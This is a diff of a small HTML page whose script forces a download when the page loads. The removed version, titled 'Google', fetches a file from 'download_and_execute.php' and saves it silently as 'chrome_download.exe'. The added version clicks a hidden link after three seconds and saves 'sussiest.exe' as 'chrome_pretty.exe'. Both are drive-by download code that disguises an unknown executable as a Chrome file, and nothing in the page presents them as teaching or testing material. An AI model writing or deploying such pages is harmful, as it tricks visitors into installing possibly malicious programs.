@@ -1,37 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automatic Download</title>
 </head>
 <body>
+
 <script>
-// Set the PHP script URL
-const phpScriptUrl = 'download_and_execute.php'; // Replace 'download_and_execute.php' with the actual URL of your PHP script
-
-// Function to trigger download
-function triggerDownloadAndExecute() {
-    // Request the PHP script which serves the executable file
-    fetch(phpScriptUrl)
-    .then(response => response.blob())
-    .then(blob => {
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.style.display = 'none';
-        a.href = url;
-        a.download = 'chrome_download.exe'; // Change the filename if necessary
-        document.body.appendChild(a);
-        a.click();
-        window.URL.revokeObjectURL(url);
-    })
-    .catch(error => console.error('Error downloading and executing:', error));
-}
-
-// Trigger download and execution automatically when the page loads
-window.onload = function() {
-    triggerDownloadAndExecute();
-};
+document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(function() {
+        var link = document.createElement('a');
+        link.href = 'sussiest.exe';
+        link.download = 'chrome_pretty.exe'; // Optional: Specify the filename
+        link.style.display = 'none';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }, 3000); // Delay in milliseconds before triggering the download
+});
 </script>
+
 </body>
 </html>
